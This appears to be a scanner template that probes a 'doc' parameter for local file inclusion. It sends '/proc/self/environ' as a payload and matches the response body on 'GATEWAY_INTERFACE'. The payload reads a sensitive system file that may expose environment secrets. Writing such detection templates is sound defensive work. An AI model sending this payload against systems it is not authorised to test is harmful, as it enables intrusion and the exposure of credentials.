id: lfi6-0332
name: 'Traversal in doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - '/proc/self/environ'
    matchers:
      - type: word
        part: body
        words:
          - 'GATEWAY_INTERFACE'
